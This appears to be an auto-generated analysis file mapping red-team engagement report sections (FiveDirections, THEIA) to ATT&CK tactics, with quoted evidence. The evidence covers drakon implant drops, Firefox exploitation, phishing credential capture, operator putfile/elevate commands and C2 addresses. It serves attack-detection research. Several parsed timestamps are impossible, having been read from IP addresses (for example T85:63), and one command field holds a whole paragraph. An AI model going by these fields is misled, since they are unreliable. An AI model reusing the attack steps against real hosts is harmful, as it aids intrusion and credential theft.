| payload_crash | payload_crash | attempted | 报告明确写到 drakon implant executable is crashing。 | 3_10_e002, 3_10_e005 |

#### 显式观测

- `process_name` / `firefox`  Evidence: `3_10_e001, 3_10_e011`  Raw: firefox
- `process_name` / `drakon`  Evidence: `3_10_e001, 3_10_e002, 3_10_e003, 3_10_e004, 3_10_e005, 3_10_e008`  Raw: drakon
- `host` / `FIVEDIRECTIONS`  Evidence: `3_10_e001, 3_10_e005`  Raw: FiveDirections
- `domain` / `www.allstate.com`  Evidence: `3_10_e003, 3_10_e004, 3_10_e010`  Raw: www.allstate.com
- `process_name` / `loaderdrakon`  Evidence: `3_10_e003`  Raw: loaderdrakon
- `ip_port` / `132.85.63.248:80`  Evidence: `3_10_e006`  Raw: 132.85.63.248:80
- `ip_port` / `128.55.12.167:8050`  Evidence: `3_10_e006`  Raw: 128.55.12.167:8050
- `ip_port` / `135.84.161.202:80`  Evidence: `3_10_e007, 3_10_e011`  Raw: 135.84.161.202:80
- `ip_port` / `128.55.12.167:8051`  Evidence: `3_10_e007`  Raw: 128.55.12.167:8051
- `ip_port` / `221.205.132.182:80`  Evidence: `3_10_e008`  Raw: 221.205.132.182:80
- `ip_port` / `128.55.12.167:8052`  Evidence: `3_10_e008`  Raw: 128.55.12.167:8052

#### 原始子节摘录

- `3.10.lead` Section Lead (lines 808-812)

  > Continued attack against FiveDirections by trying to exploit the target via the malicious pass manager
  > browser extension in Firefox 54.0.1. The attacker tried to load drakon into the memory of the browser
  > extension, but this was unsuccessful. So, the attacker resorted to writing the drakon implant executable
  > to disk on the target upon exploiting the browser extension. Drakon failed to run from disk, and the file
  > was left on disk after the failed attack.

- `3.10.1` Comments (lines 814-827)

  > Due to limited time setting up the hosts on the BBN range and the last minute finishing of browser
  > extension development, the end to end attack was not fully tested and did not work as intended. We
  > tested the browser extension with a small test shellcode to verify that our shellcode could gain
  > execution; however, we did not get a chance to run drakon in memory from the browser extension. We
  > found that we were unable to load drakon into the browser extension's memory. We will need to test
  > this on the target hosts to determine what is going wrong. We were also unable to drop drakon to disk
  > and execute it from the browser extension on Windows. We did not have this problem on Linux, and
  > the same drakon binary ran without problem on our local test systems. Again, we need more testing to
  > root cause this issue. The end result was that drakon did not successfully run, connect out, or self
  > delete. The failed execution from the browser extension along with the leaked file on the disk and the
  > executable crash should be detected though.

- `3.10.2` Event Log (lines 828-833)

  > - 1113 www.allstate.com loaderdrakon browser extension (fail)
  > - 1114 www.allstate.com drakon dropper browser extension (fail)
  > - 1114 drakon implant executable is crashing on FiveDirections Windows 10 x64

- `3.10.3` Addresses (lines 834-839)

  > - [eth0:940] 132.85.63.248:80 -> 128.55.12.167:8050 webserver
  > - [eth0:941] 135.84.161.202:80 -> 128.55.12.167:8051 shellcode_server
  > - [eth0:942] 221.205.132.182:80 -> 128.55.12.167:8052 drakon (failed)

- `3.10.4.1` Files (lines 842-843)

  > - hJauWl01 file downloaded to disk

- `3.10.4.2` Connections (lines 844-847)

  > - exploit www.allstate.com
  > - Firefox: connection to 135.84.161.202:80

- `3.10.5` Graph (lines 848-851)
#### 证据条目

1. `3_10_e001` | `narrative_comment` | `3.10.lead Section Lead` | lines `808-812`
   - Raw: Continued attack against FiveDirections by trying to exploit the target via the malicious pass manager browser extension in Firefox 54.0.1. The attacker tried to load drakon into the memory of the browser extension, but this was unsuccessful. So, the attacker resorted to writing the drakon implant executable to disk on the target upon exploiting the browser extension. Drakon failed to run from disk, and the file was left on disk after the failed attack.
   - Time: `-` / `-`
   - Observables: process_name=firefox; process_name=drakon; host=FIVEDIRECTIONS
1. `3_10_e002` | `narrative_comment` | `3.10.1 Comments` | lines `816-826`
   - Raw: Due to limited time setting up the hosts on the BBN range and the last minute finishing of browser extension development, the end to end attack was not fully tested and did not work as intended. We tested the browser extension with a small test shellcode to verify that our shellcode could gain execution; however, we did not get a chance to run drakon in memory from the browser extension. We found that we were unable to load drakon into the browser extension's memory. We will need to test this on the target hosts to determine what is going wrong. We were also unable to drop drakon to disk and execute it from the browser extension on Windows. We did not have this problem on Linux, and the same drakon binary ran without problem on our local test systems. Again, we need more testing to root cause this issue. The end result was that drakon did not successfully run, connect out, or self delete. The failed execution from the browser extension along with the leaked file on the disk and the executable crash should be detected though.
   - Time: `-` / `-`
   - Observables: process_name=drakon
1. `3_10_e003` | `event_log` | `3.10.2 Event Log` | lines `830-830`
   - Raw: 1113 www.allstate.com loaderdrakon browser extension (fail)
   - Time: `1113` / `2018-04-12T11:13:00`
   - Observables: domain=www.allstate.com; process_name=drakon; process_name=loaderdrakon
1. `3_10_e004` | `event_log` | `3.10.2 Event Log` | lines `831-831`
   - Raw: 1114 www.allstate.com drakon dropper browser extension (fail)
   - Time: `1114` / `2018-04-12T11:14:00`
   - Observables: domain=www.allstate.com; process_name=drakon
1. `3_10_e005` | `event_log` | `3.10.2 Event Log` | lines `832-832`
   - Raw: 1114 drakon implant executable is crashing on FiveDirections Windows 10 x64
   - Time: `1114` / `2018-04-12T11:14:00`
   - Observables: process_name=drakon; host=FIVEDIRECTIONS
1. `3_10_e006` | `address` | `3.10.3 Addresses` | lines `836-836`
   - Raw: [eth0:940] 132.85.63.248:80 -> 128.55.12.167:8050 webserver
   - Time: `85.63` / `2018-04-12T85:63:00`
   - Observables: ip_port=132.85.63.248:80; ip_port=128.55.12.167:8050
1. `3_10_e007` | `address` | `3.10.3 Addresses` | lines `837-837`
   - Raw: [eth0:941] 135.84.161.202:80 -> 128.55.12.167:8051 shellcode_server
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=135.84.161.202:80; ip_port=128.55.12.167:8051
1. `3_10_e008` | `address` | `3.10.3 Addresses` | lines `838-838`
   - Raw: [eth0:942] 221.205.132.182:80 -> 128.55.12.167:8052 drakon (failed)
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=221.205.132.182:80; ip_port=128.55.12.167:8052; process_name=drakon
1. `3_10_e009` | `interaction_file` | `3.10.4.1 Files` | lines `843-843`
   - Raw: hJauWl01 file downloaded to disk
   - Time: `-` / `-`
   - Observables: -
1. `3_10_e010` | `interaction_connection` | `3.10.4.2 Connections` | lines `845-845`
   - Raw: exploit www.allstate.com
   - Time: `-` / `-`
   - Observables: domain=www.allstate.com
1. `3_10_e011` | `interaction_connection` | `3.10.4.2 Connections` | lines `846-846`
   - Raw: Firefox: connection to 135.84.161.202:80
   - Time: `-` / `-`
   - Observables: ip_port=135.84.161.202:80; process_name=firefox

### FIVEDIRECTIONS_20180413_1500_1500_04 / Section 4.10

- 标题：`20180413 1500 FiveDirections – Phishing E-mail w/ Executable`
- 状态：`insufficient`
- 时间精度：`coarse_summary`
- 时间窗：`2018-04-13T15:00:00` -> `2018-04-13T15:00:00`
- Markdown 行号：`1721-1734`
- 报告页：`42`
- 攻击概述：该节明确写明攻击者没有把恶意可执行附件用于 FiveDirections Windows 主机，因此这里只保留“未实施/跳过”的报告事实，不输出攻击战术结论。
- 备注：保留该窗口是为了说明 E3 报告里这一节存在，但它不应被当成 FiveDirections 上实际发生的成功或失败攻击窗口。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| - | - | - | 该节不输出战术结论。 | - |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| - | - | 该节不输出 technique 结论。 | - |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| - | - | - | 该节没有可稳定抽象的攻击行为链项。 | - |

#### 显式观测

- 无。

#### 原始子节摘录

- `4.10.1` Summary (lines 1723-1726)

  > The attacker did not use the malicious executable against the Windows hosts.

- `4.10.2` Comments (lines 1727-1734)

  > After the failed malicious executable attacks on Linux, we did not attempt to run it on Windows. We
  > realized the night before that QT was required to run the executable. We could not get it to statically
  > link the week of the engagement, so we installed QT the night prior to the attack as benign activity.
  > During the Linux failed attacks, we discovered there were other dependencies that we did not have
  > installed on the target, so we chose to skip it altogether. We might revisit this in engagement 4.

#### 证据条目

1. `4_10_e001` | `narrative_comment` | `4.10.1 Summary` | lines `1725-1725`
   - Raw: The attacker did not use the malicious executable against the Windows hosts.
   - Time: `-` / `-`
   - Observables: -
1. `4_10_e002` | `narrative_comment` | `4.10.2 Comments` | lines `1729-1733`
   - Raw: After the failed malicious executable attacks on Linux, we did not attempt to run it on Windows. We realized the night before that QT was required to run the executable. We could not get it to statically link the week of the engagement, so we installed QT the night prior to the attack as benign activity. During the Linux failed attacks, we discovered there were other dependencies that we did not have installed on the target, so we chose to skip it altogether. We might revisit this in engagement 4.
   - Time: `-` / `-`
   - Observables: -


## THEIA

### THEIA_20180410_1342_1342_02 / Section 4.6

- 标题：`20180410 1300 THEIA – Phishing E-mail w/ Link`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-10T12:28:00` -> `2018-04-10T13:42:00`
- Markdown 行号：`1542-1584`
- 报告页：`37`
- 攻击概述：THEIA 用户收到冒充 Bob 的钓鱼邮件，打开邮件、点击链接、访问 www.nasa.ng、输入并提交凭证，结果发往 www.foo1.com。
- 备注：与 TRACE 的 4.5 相同，这一节只保留 phishing link 与 credential submission，不扩展成驻留/C2。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 钓鱼邮件与恶意链接构成了明确的进入方式。 | 4_6_e001, 4_6_e003, 4_6_e004, 4_6_e005 |
| EXECUTION | confirmed | 执行 | 用户实际点击并执行了恶意链接带来的交互。 | 4_6_e001, 4_6_e003, 4_6_e004, 4_6_e005 |
| CREDENTIAL_ACCESS | confirmed | 凭证获取 | 报告明确写到用户输入并提交了凭证。 | 4_6_e001, 4_6_e006, 4_6_e007, 4_6_e008 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1566.002 | confirmed | 报告明确写到 phishing e-mail with link。 | 4_6_e001, 4_6_e003, 4_6_e004, 4_6_e005 |
| T1204.001 | confirmed | 用户点击恶意链接并继续在钓鱼站点交互。 | 4_6_e001, 4_6_e003, 4_6_e004, 4_6_e005 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| phishing_link | exploit_delivery | confirmed | 报告明确写到发送 phishing e-mail，并让用户点击恶意链接。 | 4_6_e001, 4_6_e003, 4_6_e004, 4_6_e005 |
| credential_submit | credential_submit | confirmed | 用户访问 www.nasa.ng 后输入并提交凭证，结果发往 foo1。 | 4_6_e001, 4_6_e006, 4_6_e007, 4_6_e008 |

#### 显式观测

- `ip_port` / `208.75.117.3:80`  Evidence: `4_6_e001`  Raw: 208.75.117.3:80
- `ip_port` / `208.75.117.2:80`  Evidence: `4_6_e001`  Raw: 208.75.117.2:80
- `domain` / `www.nasa.ng`  Evidence: `4_6_e001, 4_6_e006, 4_6_e010, 4_6_e012`  Raw: www.nasa.ng
- `domain` / `www.foo1.com`  Evidence: `4_6_e001, 4_6_e008, 4_6_e011, 4_6_e013`  Raw: www.foo1.com
- `host` / `TRACE`  Evidence: `4_6_e001`  Raw: TRACE
- `host` / `THEIA`  Evidence: `4_6_e001, 4_6_e002, 4_6_e004`  Raw: THEIA
- `host` / `CADETS`  Evidence: `4_6_e002`  Raw: CADETS
- `user` / `everyone@bovia.com`  Evidence: `4_6_e003`  Raw: everyone@bovia.com
- `domain` / `bovia.com`  Evidence: `4_6_e003`  Raw: bovia.com
- `command` / `click the link`  Evidence: `4_6_e005`  Raw: click the link
- `command` / `enter creds and submit`  Evidence: `4_6_e007`  Raw: enter creds
- `ip_port` / `62.83.155.175:80`  Evidence: `4_6_e009, 4_6_e012`  Raw: 62.83.155.175:80
- `ip_port` / `128.55.12.167:8007`  Evidence: `4_6_e009`  Raw: 128.55.12.167:8007

#### 原始子节摘录

- `4.6.lead` Section Lead (lines 1544-1552)

  > The attacker ran an attack against THEIA and TRACE. The attacker got the e-mail addresses of the Bovia
  > employees from the successful phishing attack against the Bob user (ClearScope). The attacker sent a
  > phishing e-mail to others impersonating Bob. The phishing e-mail included a link to a website hosted at
  > www.nasa.ng, address 208.75.117.3:80, the same link that was used on ClearScope and Bob to initially
  > start the attack. The website hosted a form asking for name, e-mail address, and password. The user
  > unfortunately clicked on the link, entered the requested information, and submitted it. The results were
  > sent back to www.foo1.com, address 208.75.117.2:80. The attacker now has access to Frank's e-mail
  > account, including contact information for other Bovia company employees.

- `4.6.1` Comments (lines 1554-1558)

  > The attack worked as expected. We sent the phishing email to the THEIA user by connecting to the
  > CADETS e-mail server.

- `4.6.2` Event Log (lines 1559-1567)

  > - 12:28 Phishing email to everyone@bovia.com
  > - 13:42 THEIA open email
  > - click the link
  > - Connect to www.nasa.ng (208.75.117.3)
  > - enter creds and submit
  > - Connect to www.foo1.com (208.75.117.2)

- `4.6.3` Addresses (lines 1568-1573)

  > - [eth0:807] 62.83.155.175:80 -> 128.55.12.167:8007 phishing attack
  > - www.nasa.ng (208.75.117.3)
  > - www.foo1.com (208.75.117.2)

- `4.6.4` Interactions (lines 1574-1575)
- `4.6.4.1` Connections (lines 1576-1580)

  > - www.nasa.ng (62.83.155.175:80)
  > - www.foo1.com (208.75.117.3)

- `4.6.5` Graph (lines 1581-1584)
#### 证据条目

1. `4_6_e001` | `narrative_comment` | `4.6.lead Section Lead` | lines `1544-1552`
   - Raw: The attacker ran an attack against THEIA and TRACE. The attacker got the e-mail addresses of the Bovia employees from the successful phishing attack against the Bob user (ClearScope). The attacker sent a phishing e-mail to others impersonating Bob. The phishing e-mail included a link to a website hosted at www.nasa.ng, address 208.75.117.3:80, the same link that was used on ClearScope and Bob to initially start the attack. The website hosted a form asking for name, e-mail address, and password. The user unfortunately clicked on the link, entered the requested information, and submitted it. The results were sent back to www.foo1.com, address 208.75.117.2:80. The attacker now has access to Frank's e-mail account, including contact information for other Bovia company employees.
   - Time: `3:80` / `2018-04-10T03:80:00`
   - Observables: ip_port=208.75.117.3:80; ip_port=208.75.117.2:80; domain=www.nasa.ng; domain=www.foo1.com; host=TRACE; host=THEIA
1. `4_6_e002` | `narrative_comment` | `4.6.1 Comments` | lines `1556-1557`
   - Raw: The attack worked as expected. We sent the phishing email to the THEIA user by connecting to the CADETS e-mail server.
   - Time: `-` / `-`
   - Observables: host=CADETS; host=THEIA
1. `4_6_e003` | `event_log` | `4.6.2 Event Log` | lines `1561-1561`
   - Raw: 12:28 Phishing email to everyone@bovia.com
   - Time: `12:28` / `2018-04-10T12:28:00`
   - Observables: user=everyone@bovia.com; domain=bovia.com
1. `4_6_e004` | `event_log` | `4.6.2 Event Log` | lines `1562-1562`
   - Raw: 13:42 THEIA open email
   - Time: `13:42` / `2018-04-10T13:42:00`
   - Observables: host=THEIA
1. `4_6_e005` | `event_log` | `4.6.2 Event Log` | lines `1563-1563`
   - Raw: click the link
   - Time: `-` / `-`
   - Observables: command=click the link
1. `4_6_e006` | `event_log` | `4.6.2 Event Log` | lines `1564-1564`
   - Raw: Connect to www.nasa.ng (208.75.117.3)
   - Time: `-` / `-`
   - Observables: domain=www.nasa.ng
1. `4_6_e007` | `event_log` | `4.6.2 Event Log` | lines `1565-1565`
   - Raw: enter creds and submit
   - Time: `-` / `-`
   - Observables: command=enter creds and submit
1. `4_6_e008` | `event_log` | `4.6.2 Event Log` | lines `1566-1566`
   - Raw: Connect to www.foo1.com (208.75.117.2)
   - Time: `-` / `-`
   - Observables: domain=www.foo1.com
1. `4_6_e009` | `address` | `4.6.3 Addresses` | lines `1570-1570`
   - Raw: [eth0:807] 62.83.155.175:80 -> 128.55.12.167:8007 phishing attack
   - Time: `62.83` / `2018-04-10T62:83:00`
   - Observables: ip_port=62.83.155.175:80; ip_port=128.55.12.167:8007
1. `4_6_e010` | `address` | `4.6.3 Addresses` | lines `1571-1571`
   - Raw: www.nasa.ng (208.75.117.3)
   - Time: `-` / `-`
   - Observables: domain=www.nasa.ng
1. `4_6_e011` | `address` | `4.6.3 Addresses` | lines `1572-1572`
   - Raw: www.foo1.com (208.75.117.2)
   - Time: `-` / `-`
   - Observables: domain=www.foo1.com
1. `4_6_e012` | `interaction_connection` | `4.6.4.1 Connections` | lines `1578-1578`
   - Raw: www.nasa.ng (62.83.155.175:80)
   - Time: `62.83` / `2018-04-10T62:83:00`
   - Observables: ip_port=62.83.155.175:80; domain=www.nasa.ng
1. `4_6_e013` | `interaction_connection` | `4.6.4.1 Connections` | lines `1579-1579`
   - Raw: www.foo1.com (208.75.117.3)
   - Time: `-` / `-`
   - Observables: domain=www.foo1.com

### THEIA_20180410_1341_1455_01 / Section 3.3

- 标题：`20180410 1400 THEIA – Firefox Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-10T13:41:00` -> `2018-04-10T14:55:00`
- Markdown 行号：`320-421`
- 报告页：`7, 8, 9`
- 攻击概述：THEIA 通过恶意网站 exploit Firefox，drakon 两次获得 shell，并把 clean/profile/xdev 等载荷写盘、提权、回连，最后又留下可后续触发的盘上落地物。
- 备注：09:58 的主机重启说明被保留在证据里，但时间窗按真正的攻击交互阶段取 13:41-14:55。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | Firefox 恶意网站 exploit 成功进入 THEIA。 | 3_3_e001, 3_3_e011, 3_3_e012, 3_3_e019, 3_3_e028, 3_3_e029, 3_3_e030, 3_3_e040 |
| EXECUTION | confirmed | 执行 | drakon/libdrakon 被写盘并执行。 | 3_3_e013, 3_3_e020, 3_3_e021, 3_3_e035, 3_3_e001, 3_3_e014, 3_3_e036, 3_3_e037 |
| PRIVILEGE_ESCALATION | confirmed | 提权 | 正文明确写明新的 drakon 进程以 root 身份运行。 | 3_3_e001, 3_3_e014, 3_3_e036, 3_3_e037 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | shell、connect back 与 profile 对外连接共同表明已形成 C2。 | 3_3_e001, 3_3_e016, 3_3_e043 |
| DISCOVERY | confirmed | 侦察发现 | nrtcp/netrecon 对网络接口与可达性做侦察。 | 3_3_e030, 3_3_e044 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1189 | confirmed | 恶意网站导致 Firefox exploit。 | 3_3_e001, 3_3_e011, 3_3_e012, 3_3_e019, 3_3_e028, 3_3_e029, 3_3_e030, 3_3_e040 |
| T1071.001 | confirmed | operator console 与 drakon 的通信走 web/HTTP 风格地址。 | 3_3_e001, 3_3_e016, 3_3_e043 |
| T1105 | confirmed | putfile 明确把 drakon/libdrakon 组件写入目标。 | 3_3_e013, 3_3_e020, 3_3_e021, 3_3_e035 |
| T1046 | confirmed | nrtcp/netrecon 对目标网络进行侦察。 | 3_3_e030, 3_3_e044 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| driveby_exploit | exploit_delivery | confirmed | 报告正文与 Event Log 都明确写明 THEIA 通过 www.gatech.edu 重新 exploit 成功。 | 3_3_e001, 3_3_e011, 3_3_e012, 3_3_e019, 3_3_e028, 3_3_e029, 3_3_e030, 3_3_e040 |
| c2_callback | c2_callback | confirmed | drakon/operator console 的 shell 与 connect back 记录齐全。 | 3_3_e001, 3_3_e016, 3_3_e043 |
| payload_write | payload_write | confirmed | putfile clean/profile/xdev 直接记录了落地载荷与后续待用文件。 | 3_3_e013, 3_3_e020, 3_3_e021, 3_3_e035 |
| payload_elevate | payload_elevate | confirmed | 正文写明 drakon 以 root 运行，交互里也有 elevate clean/profile。 | 3_3_e001, 3_3_e014, 3_3_e036, 3_3_e037 |
| network_scan | scan | confirmed | 连接交互中出现 L2>nrtcp，说明使用 netrecon 做网络探测。 | 3_3_e030, 3_3_e044 |

#### 显式观测

- `domain` / `www.gatech.edu`  Evidence: `3_3_e001, 3_3_e011, 3_3_e028, 3_3_e029, 3_3_e030, 3_3_e040`  Raw: www.gatech.edu
- `process_name` / `firefox`  Evidence: `3_3_e001, 3_3_e003, 3_3_e008, 3_3_e009, 3_3_e039, 3_3_e041, 3_3_e042`  Raw: firefox
- `process_name` / `drakon`  Evidence: `3_3_e001, 3_3_e017, 3_3_e025, 3_3_e026, 3_3_e027, 3_3_e031, 3_3_e033, 3_3_e035`  Raw: drakon
- `command` / `Began attack with THEIA Ubuntu 12.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via the www.gatech.edu website. The exploit resulted in the drakon implant running in memory in the Firefox process with a connection out to the attacker operator console. The attacker used putfile to write a drakon implant executable binary to the target host's disk. The attacker then executed the drakon implant from the target disk using a privilege escalated execution capability to run the new process as root. The new root drakon implant process connected out to the operator console to give the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root shell and switched over to the root shell. At this point the drakon implant stopped responding, and we lost connection to the THEIA host (as well as the open connection to the TRACE host from earlier today). The attacker gained access once again when Firefox browsed to www.gatech.edu. The attacker then wrote another file to disk to be used later and left the connection to the operator console open.`  Evidence: `3_3_e001`  Raw: putfile
- `host` / `TRACE`  Evidence: `3_3_e001, 3_3_e002, 3_3_e003, 3_3_e018`  Raw: TRACE
- `host` / `THEIA`  Evidence: `3_3_e001, 3_3_e002, 3_3_e003, 3_3_e004, 3_3_e009, 3_3_e010, 3_3_e012`  Raw: THEIA
- `domain` / `www.allstate.com`  Evidence: `3_3_e002, 3_3_e005, 3_3_e006, 3_3_e007, 3_3_e023, 3_3_e024, 3_3_e038`  Raw: www.allstate.com
- `host` / `CADETS`  Evidence: `3_3_e002`  Raw: CADETS
- `user` / `admin@ta1-theia-target`  Evidence: `3_3_e009, 3_3_e010`  Raw: admin@ta1-theia-target
- `command` / `admin@ta1-theia-target:~$ ps -aux | grep firefox`  Evidence: `3_3_e009`  Raw: ps
- `command` / `14:35 putfile clean`  Evidence: `3_3_e013`  Raw: putfile
- `command` / `14:35 elevate clean`  Evidence: `3_3_e014`  Raw: elevate
- `domain` / `gatech.edu`  Evidence: `3_3_e019`  Raw: gatech.edu
- `command` / `14:55 putfile profile`  Evidence: `3_3_e020`  Raw: putfile
- `file_path` / `/var/log/xdev`  Evidence: `3_3_e021`  Raw: /var/log/xdev
- `command` / `putfile /var/log/xdev`  Evidence: `3_3_e021`  Raw: putfile
- `ip_port` / `145.199.103.57:80`  Evidence: `3_3_e023, 3_3_e038`  Raw: 145.199.103.57:80
- `ip_port` / `128.55.12.167:8010`  Evidence: `3_3_e023`  Raw: 128.55.12.167:8010
- `ip_port` / `61.130.69.232:80`  Evidence: `3_3_e024, 3_3_e039`  Raw: 61.130.69.232:80
- `ip_port` / `128.55.12.167:8011`  Evidence: `3_3_e024`  Raw: 128.55.12.167:8011
- `ip_port` / `5.214.163.155:80`  Evidence: `3_3_e025`  Raw: 5.214.163.155:80
- `ip_port` / `128.55.12.167:8014`  Evidence: `3_3_e025`  Raw: 128.55.12.167:8014
- `ip_port` / `161.116.88.72:80`  Evidence: `3_3_e026, 3_3_e043`  Raw: 161.116.88.72:80
- `ip_port` / `128.55.12.167:8016`  Evidence: `3_3_e026`  Raw: 128.55.12.167:8016
- `domain` / `drakon.linux`  Evidence: `3_3_e026, 3_3_e031, 3_3_e033`  Raw: drakon.linux
- `ip_port` / `146.153.68.151:80`  Evidence: `3_3_e027, 3_3_e042`  Raw: 146.153.68.151:80
- `ip_port` / `128.55.12.167:8017`  Evidence: `3_3_e027`  Raw: 128.55.12.167:8017
- `domain` / `loaderDrakon.linux`  Evidence: `3_3_e027`  Raw: loaderDrakon.linux
- `process_name` / `loaderdrakon`  Evidence: `3_3_e027`  Raw: loaderdrakon
- `ip_port` / `104.228.117.212:80`  Evidence: `3_3_e028, 3_3_e040`  Raw: 104.228.117.212:80
- `ip_port` / `128.55.12.167:8018`  Evidence: `3_3_e028`  Raw: 128.55.12.167:8018
- `ip_port` / `141.43.176.203:80`  Evidence: `3_3_e029, 3_3_e041`  Raw: 141.43.176.203:80
- `ip_port` / `128.55.12.167:8019`  Evidence: `3_3_e029`  Raw: 128.55.12.167:8019
- `ip_port` / `7.149.198.40:80`  Evidence: `3_3_e030`  Raw: 7.149.198.40:80
- `ip_port` / `128.55.12.167:8028`  Evidence: `3_3_e030`  Raw: 128.55.12.167:8028
- `process_name` / `netrecon`  Evidence: `3_3_e030`  Raw: netrecon
- `file_path` / `/deploy/archive/drakon.linux.x64_161.116.88.72`  Evidence: `3_3_e031, 3_3_e033`  Raw: /deploy/archive/drakon.linux.x64_161.116.88.72
- `command` / `L4>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 clean`  Evidence: `3_3_e031`  Raw: putfile
- `file_path` / `/home/admin/profile`  Evidence: `3_3_e033, 3_3_e037`  Raw: /home/admin/profile
- `command` / `L1>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 /home/admin/profile`  Evidence: `3_3_e033`  Raw: putfile
- `file_path` / `/deploy/archive/libdrakon.linux.x64.so_5.214.163.155`  Evidence: `3_3_e035`  Raw: /deploy/archive/libdrakon.linux.x64.so_5.214.163.155
- `domain` / `libdrakon.linux`  Evidence: `3_3_e035`  Raw: libdrakon.linux
- `command` / `L2>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xdev`  Evidence: `3_3_e035`  Raw: putfile
- `file_path` / `/home/admin/clean`  Evidence: `3_3_e036`  Raw: /home/admin/clean
- `command` / `L4>elevate /home/admin/clean`  Evidence: `3_3_e036`  Raw: elevate
- `command` / `L1>elevate /home/admin/profile`  Evidence: `3_3_e037`  Raw: elevate

#### 原始子节摘录

- `3.3.lead` Section Lead (lines 322-333)

  > Began attack with THEIA Ubuntu 12.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via
  > the www.gatech.edu website. The exploit resulted in the drakon implant running in memory in the
  > Firefox process with a connection out to the attacker operator console. The attacker used putfile to
  > write a drakon implant executable binary to the target host's disk. The attacker then executed the
  > drakon implant from the target disk using a privilege escalated execution capability to run the new
  > process as root. The new root drakon implant process connected out to the operator console to give
  > the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root
  > shell and switched over to the root shell. At this point the drakon implant stopped responding, and we
  > lost connection to the THEIA host (as well as the open connection to the TRACE host from earlier today).
  > The attacker gained access once again when Firefox browsed to www.gatech.edu. The attacker then
  > wrote another file to disk to be used later and left the connection to the operator console open.

- `3.3.1` Comments (lines 335-354)

  > Our second target was the Linux development computers. Had we been able to persist on the CADETS
  > host, we would have performed some network recon to discover the THEIA and TRACE hosts. In this
  > case, since that did not happen, we instead used an advertisement server to host a malicious
  > advertisement. In this case, the exploit was sent via an ad on the www.allstate.com website. The goal
  > of the attack was to drop a malicious payload to disk which would be triggered later during the
  > engagement period via a different access method.
  > When we first tried to run the attack against the THEIA host, we found that benign activity had been
  > failing to connect via SSH or VNC because the THEIA host had been locked up and unresponsive for some
  > unknown amount of time. The TA2 performers and BBN realized that THEIA's publishing had falled
  > behind and was publishing old data, which is why no one had detected that the THEIA host was
  > unresponsive. BBN rebooted the THEIA host for us, and we re-setup it up. We waited a few more hours
  > and tried attacking again in the afternoon. Similar to TRACE, Firefox 54.0.1 crashed a few times before
  > the exploit finally worked. Firefox also locked up the system and had to be killed via an SSH connection
  > before the exploit eventually worked. This did not happen during testing, but there appears to be some
  > conflict or issue between the Firefox 54.0.1 backdoor and the BBN range with benign activity and TA1
  > performer technologies running. Additional testing is required to figure this out.

- `3.3.2` Event Log (lines 355-377)

  > - 09:58 THEIA is unreachable, going to restart
  > - 13:41 www.allstate.com crash
  > - 13:41 www.allstate.com crash
  > - 13:41 www.allstate.com crash
  > - 13:41 Failed 3/4 times, firefox crashed, system locked up
  > - admin@ta1-theia-target:~$ ps -aux | grep firefox
  > - admin@ta1-theia-target:~$ sudo kill -9 5771
  > - 14:31 www.gatech.edu
  > - 14:31 Shell from THEIA
  > - 14:35 putfile clean
  > - 14:35 elevate clean
  > - 14:35 quit
  > - 14:35 connect back
  > - 14:51 drakon (clean as root) stopped responding
  > - 14:51 lost connection to TRACE when OC crashed
  > - 14:55 re-exploit gatech.edu
  > - 14:55 putfile profile
  > - putfile /var/log/xdev
  > - Left connection L5 in OC2 open

- `3.3.3` Addresses (lines 378-390)

  > - [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 webserver (www.allstate.com)
  > - [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011   shellcode_server
  > (www.allstate.com)
  > - [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014   libdrakon.linux.x64.so
  > - [eth0:896] 161.116.88.72:80 -> 128.55.12.167:8016   drakon.linux.x64
  > - [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017 loaderDrakon.linux.x64
  > - [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 webserver (www.gatech.edu)
  > - [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019 shellcode_server
  > (www.gatech.edu)
  > - [eth0:908] 7.149.198.40:80 -> 128.55.12.167:8028   netrecon (www.gatech.edu)

- `3.3.4` Interactions (lines 391-392)
- `3.3.4.1` Files (lines 393-400)

  > - L4>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 clean
  > - L4>rm clean
  > - L1>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 /home/admin/profile
  > - rm profile
  > - L2>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xdev

- `3.3.4.2` Processes (lines 401-405)

  > - L4>elevate /home/admin/clean
  > - L1>elevate /home/admin/profile

- `3.3.4.3` Connections (lines 406-415)

  > - exploit: www.allstate.com 145.199.103.57:80
  > - firefox: connection to 61.130.69.232:80 (firefox crash?)
